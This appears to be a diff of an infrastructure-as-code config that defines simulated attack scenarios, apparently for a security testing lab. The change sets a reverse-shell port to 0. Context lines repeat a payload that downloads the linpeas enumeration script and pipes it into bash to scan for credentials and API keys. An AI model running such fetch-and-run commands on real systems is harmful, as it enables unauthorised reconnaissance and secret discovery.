@@ -833,7 +833,7 @@ variable "config" {
                 target_port                 = null
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 reverse_shell               = false
-                reverse_shell_port          = 4444
+                reverse_shell_port          = 0
                 attack_delay                =  50400
               },
               docker_composite_compromised_credentials_attack = {
@@ -1050,7 +1050,7 @@ variable "config" {
                 target_port                 = null
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 reverse_shell               = false
-                reverse_shell_port          = 4444
+                reverse_shell_port          = 0
                 attack_delay                =  50400
               },
               docker_composite_compromised_credentials_attack = {
@@ -1292,7 +1292,7 @@ variable "config" {
                 target_port                 = null
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 reverse_shell               = false
-                reverse_shell_port          = 4444
+                reverse_shell_port          = 0
                 attack_delay                =  50400
               },
               docker_composite_compromised_credentials_attack = {
